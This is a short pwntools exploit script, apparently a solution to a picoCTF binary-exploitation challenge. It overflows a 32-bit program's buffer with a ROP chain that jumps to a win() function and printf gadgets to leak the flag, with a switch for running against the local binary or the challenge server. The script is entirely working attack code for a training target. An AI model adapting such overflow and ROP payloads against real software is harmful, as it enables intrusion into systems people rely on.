from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
context.arch = "i386"  # 32-bit

elf = ELF("./vuln")
rop = ROP(elf)
ret = rop.find_gadget(["ret"]).address


# ─────────────────────────────────────────────
# CONFIGURATION: Set this to True for remote, False for local
USE_REMOTE = False
REMOTE_HOST = "saturn.picoctf.net"
REMOTE_PORT = 64851
# ─────────────────────────────────────────────

if USE_REMOTE:
    io = remote(REMOTE_HOST, REMOTE_PORT)
else:
    io = elf.process()

payload = b"a" * 14 + flat(
    [
        elf.sym["win"],  # call win() which sets eax
        ret, ret, ret, ret, ret, ret, ret, ret,
        0x8049EDB,       # mov [esp+4], eax; call printf
        0x080b4011,      # 
    ]
)

io.sendlineafter(b"the flag\n", payload)
io.interactive()
